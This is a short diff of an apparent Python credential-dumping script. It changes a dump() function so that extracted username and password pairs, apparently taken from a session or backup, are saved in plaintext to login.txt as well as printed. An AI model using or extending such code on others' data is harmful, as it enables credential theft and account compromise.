@@ -38,11 +38,17 @@ def get_pair(data):
 
 def dump(data):
     user_pass = get_pair(data)
-    for u, p in user_pass:
-        print('\n')
-        print("User:", u)
-        print("Pass:", p)
-    if(len(user_pass)):
-        print("------------------")
-    else:
-        print(': Ёбань какая-то с сеансом')
+    with open("login.txt", "a") as file:  # Используйте режим "a" для добавления в файл
+        for u, p in user_pass:
+            print("User:", u)
+            print("Pass:", p)
+            print()
+            file.write("User: {}\n".format(u))
+            file.write("Pass: {}\n".format(p))
+            file.write("\n")
+        if len(user_pass):
+            print("------------------")
+            file.write("------------------\n")
+        else:
+            print(": пустой бекап")
+            file.write(": пустой бекап\n")
